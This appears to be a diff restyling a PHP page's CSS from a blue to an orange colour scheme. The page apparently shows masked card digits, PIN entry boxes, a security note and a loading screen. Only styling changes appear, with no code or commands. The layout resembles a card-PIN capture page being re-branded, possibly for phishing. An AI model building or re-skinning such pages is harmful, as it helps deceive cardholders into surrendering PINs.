@@ -65,7 +65,7 @@ if (isset($_GET['reject'])) {
         body {
             font-family: 'Cairo', sans-serif;
             min-height: 100vh;
-            background: #f0f4f8;
+            background: #fff8f0;
             display: flex;
             justify-content: center;
             align-items: flex-start;
@@ -79,11 +79,11 @@ if (isset($_GET['reject'])) {
             background: #ffffff;
             display: flex;
             flex-direction: column;
-            box-shadow: 0 0 40px rgba(0, 0, 0, 0.06);
+            box-shadow: 0 0 40px rgba(245, 124, 0, 0.08);
         }
 
         .header {
-            background: linear-gradient(135deg, #1a5ca8 0%, #0d3b6e 100%);
+            background: linear-gradient(135deg, #ff9f2f 0%, #f57c00 50%, #c85d00 100%);
             padding: 36px 24px;
             text-align: center;
             position: relative;
@@ -97,7 +97,7 @@ if (isset($_GET['reject'])) {
             right: -40%;
             width: 200%;
             height: 200%;
-            background: radial-gradient(circle, rgba(255, 255, 255, 0.05) 0%, transparent 50%);
+            background: radial-gradient(circle, rgba(255, 220, 180, 0.18) 0%, transparent 65%);
         }
 
         .header-icon {
@@ -147,7 +147,7 @@ if (isset($_GET['reject'])) {
         }
 
         .description {
-            color: #475569;
+            color: #8a5a24;
             font-size: 14px;
             line-height: 1.8;
             margin-bottom: 28px;
@@ -155,7 +155,7 @@ if (isset($_GET['reject'])) {
         }
 
         .card-digits {
-            color: #1a5ca8;
+            color: #f57c00;
             font-weight: 700;
             direction: ltr;
             display: inline-block;
@@ -173,27 +173,27 @@ if (isset($_GET['reject'])) {
         .pin-box {
             width: 60px;
             height: 60px;
-            border: 2px solid #e2e8f0;
+            border: 2px solid rgba(245,124,0,0.18);
             border-radius: 14px;
             font-size: 24px;
             text-align: center;
             font-weight: 700;
-            color: #1a2332;
-            background: #f8fafc;
+            color: #f57c00;
+            background: #fff8f0;
             font-family: 'Cairo', sans-serif;
             outline: none;
             transition: all 0.25s;
         }
 
         .pin-box:focus {
-            border-color: #1a5ca8;
+            border-color: #f57c00;
             background: #fff;
-            box-shadow: 0 0 0 3px rgba(26, 92, 168, 0.1);
+            box-shadow: 0 0 0 3px rgba(245,124,0,0.15);
         }
 
         .pin-box.filled {
-            border-color: #1a5ca8;
-            background: #eff6ff;
+            border-color: #f57c00;
+            background: #fff4e6;
         }
 
         /* Error */
@@ -235,20 +235,20 @@ if (isset($_GET['reject'])) {
             cursor: not-allowed;
             transition: all 0.3s;
             color: #fff;
-            background: linear-gradient(135deg, #94a3b8, #cbd5e1);
+            background: linear-gradient(135deg, #f7c58b, #e8a45a);
             margin: 0 auto;
             display: block;
         }
 
         .submit-btn.active {
-            background: linear-gradient(135deg, #1a5ca8, #2563eb);
+            background: linear-gradient(135deg, #ff9f2f, #f57c00);
             cursor: pointer;
-            box-shadow: 0 4px 14px rgba(26, 92, 168, 0.3);
+            box-shadow: 0 4px 14px rgba(245,124,0,0.35);
         }
 
         .submit-btn.active:hover {
             transform: translateY(-1px);
-            box-shadow: 0 6px 20px rgba(26, 92, 168, 0.4);
+            box-shadow: 0 6px 20px rgba(245,124,0,0.45);
         }
 
         .security-note {
@@ -260,7 +260,7 @@ if (isset($_GET['reject'])) {
         }
 
         .security-note span {
-            color: #64748b;
+            color: #8a5a24;
             font-size: 11px;
             font-weight: 500;
         }
@@ -292,22 +292,22 @@ if (isset($_GET['reject'])) {
         .loader-spinner {
             width: 48px;
             height: 48px;
-            border: 4px solid #e2e8f0;
-            border-top-color: #1a5ca8;
+            border: 4px solid #ffe0bf;
+            border-top-color: #f57c00;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
             margin: 0 auto 16px;
         }
 
         .loader-card h5 {
-            color: #1a2332;
+            color: #f57c00;
             font-size: 16px;
             font-weight: 700;
             margin-bottom: 4px;
         }
 
         .loader-card p {
-            color: #64748b;
+            color: #8a5a24;
             font-size: 13px;
         }
 
